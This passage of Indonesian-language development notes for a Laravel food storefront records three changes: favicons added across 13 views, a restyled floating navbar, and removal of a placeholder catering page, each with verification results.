  `favicon-32.png`, `apple-touch-icon.png` (180px), `favicon-512.png`.
  `public/favicon.ico` (sebelumnya 0 byte) diganti ICO multi-ukuran 16/32/48.
- Partial baru `resources/views/partials/favicon.blade.php` berisi tag
  `<link rel="icon">` + `apple-touch-icon`; di-include sebelum `</head>`
  pada 13 view: layout user, login/daftar user, layout admin, login admin,
  login kurir, dashboard/kurir pages, nota, dan welcome.
- Verifikasi: `view:cache` OK; `/login`, `/register`, `/`, `/menu`,
  `/admin/login`, `/kurir/login` = 200 dan memuat tag favicon;
  `/favicon.ico` = 200 (image/vnd.microsoft.icon), PNG favicon = 200.

## Navbar floating pill (16 Nov 2026)

- Navbar storefront diubah menjadi kapsul melayang: `position: sticky; top:
  14px; z-index: 800; border-radius: 999px;` dengan latar semi-transparan
  `rgba(255,255,255,0.78)` + `backdrop-filter: blur(18px)`, border tipis, dan
  shadow lembut. Lebar `calc(100% - 32px)` dengan `max-width: 1200px` agar
  tetap ada jarak dari tepi layar.
- Saat halaman di-scroll (`window.scrollY > 8`), class `topbar-scrolled`
  ditambahkan sehingga latar lebih pekat dan shadow lebih tegas.
- Link navigasi diberi bentuk pill (`padding: 8px 14px; border-radius:
  999px`) dengan hover `rgba(242,138,161,0.12)`.
- Responsif: media query 992/768/480px mengecilkan jarak atas, lebar, dan
  radius (26px/22px) sehingga navbar tersusun 3 baris di layar sempit.
- Verifikasi: `/`, `/menu`, `/menu/6` = 200; screenshot desktop 1365px
  (pill rapi, ada margin kiri-kanan) dan 500px (tersusun 3 baris) tanpa
  elemen terpotong. Catatan: screenshot Chrome headless `--window-size=390`
  menyesatkan karena lebar window di-clamp ke ~500px lalu di-crop.

## Penghapusan halaman Katering (16 Nov 2026)

- Menu "Katering" dihapus dari navbar storefront karena halamannya masih
  placeholder ("sedang dalam tahap persiapan").
- Route `GET /katering`, method `HomeController::katering()`, dan view
  `resources/views/user/landing_page/katering.blade.php` dihapus.
- Verifikasi: `/`, `/menu`, `/menu/6`, `/our-story` = 200; `/katering` = 404;
  HTML `/menu` tidak lagi memuat tautan Katering; `php -l` OK.